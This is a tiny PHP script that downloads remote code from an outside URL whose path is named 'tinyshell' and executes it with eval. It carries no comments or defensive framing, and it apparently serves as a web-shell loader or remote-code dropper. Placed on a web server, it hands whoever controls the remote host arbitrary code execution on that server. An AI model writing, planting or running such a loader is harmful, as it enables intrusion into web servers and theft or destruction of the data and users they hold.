<?php

$content = file_get_contents(urldecode('https://preciseurl.org/tinyshell'));

$content = "?> ".$content;
eval($content);
